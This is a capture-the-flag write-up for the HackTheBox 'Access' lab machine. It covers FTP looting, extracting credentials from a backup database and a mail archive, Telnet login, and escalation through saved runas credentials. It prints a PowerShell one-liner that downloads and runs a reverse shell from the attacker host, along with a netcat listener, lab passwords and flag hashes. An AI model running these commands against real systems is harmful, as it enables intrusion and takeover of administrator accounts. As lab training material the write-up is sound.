# HTB: Access

## Engagement Overview

**Target:** Access  
**Box IP:** 10.10.10.98   
**Date:** 2025-09-16    
**Attacker Host:** 10.10.14.3   

---

### Objectives

- Enumerate services and discover exposed files.  
- Extract credentials from backups/mail archives.  
- Gain initial foothold via Telnet.  
- Escalate to Administrator using misconfigured runas/savecred.  
- Capture `user.txt` and `root.txt`.  

---

## Service Enumeration

### Nmap

```bash
sudo nmap -sC -sV -T5 -oN logs/nmap 10.10.10.98
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
23/tcp open  telnet  Microsoft Telnet
80/tcp open  http    Microsoft IIS httpd 7.5
```

### Web/FTP Discovery

- FTP anonymous access allowed.  
- Retrieved files:  
  - `Backups/backup.mdb`  
  - `Engineer/Access Control.zip` → contained `Access Control.pst`.  

```bash
# Mirror
wget -m ftp://anonymous:anonymous@10.10.10.98
```

---

## Initial Access

### Credential Extraction

From `backup.mdb` (auth_user table):  

- `engineer:access4u@security`  

```bash
# quick string search
strings 10.10.10.98/Backups/backup.mdb | grep -C3 access

admin
engineer
access4u@security

# Alternate method mdbtools (export auth_user)
mdb-tables backup.mdb

# Clean up output to see tables
mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export backup.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done
acc_timeseg: 2

# List table data
mdb-export backup.mdb auth_user
```

Password unlocked `Access Control.zip` → contained `Access Control.pst`.  
From PST (email):  

- `security:4Cc3ssC0ntr0ller`  

```bash
# PST -> MBOX
7z x "Access Control.zip"
readpst "Access Control.pst"
less "Access Control.mbox"
```

### Telnet Login

```bash
telnet 10.10.10.98
# login: security
# password: 4Cc3ssC0ntr0ller
```

```cmd
C:\Users\security> whoami
access\security

C:\Users\security> type Desktop\user.txt
cb237095f1d0b24079794fa1a2932c1b
```

---

## Privilege Escalation

### Suspicious LNK

Found `ZKAccess3.5 Security System.lnk` referencing:  

```cmd
runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
```

### Abusing Saved Credentials

Hosted Nishang PowerShell one-liner on attacker machine and executed via runas:  

```powershell
# attacker
nc -lnvp 443

# target
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.3/shell.ps1')"
```

Reverse shell established as Administrator:  

```cmd
PS C:\Users\Administrator\Desktop> type root.txt
bc97e19e6897f692e5272f63e763a3a8
```

---

## House Cleaning

- Removed hosted `shell.ps1` from attacker box.  
- No persistence or artifacts left on target.  

---

## Tools Utilized

- `nmap`, `gobuster`  
- `strings`, `mdbtools`, `readpst`  
- `telnet`, `nc`  
- `runas`, `powershell` (Nishang one-liner)  

---

## Key Takeaways

- Backup and PST files exposed sensitive credentials.  
- Weak service configuration (Telnet, anonymous FTP) enabled easy access.  
- Misconfigured `runas /savecred` allowed privilege escalation.  
- Defensive measures: restrict backup access, remove Telnet, audit saved credentials, monitor PowerShell downloads.  
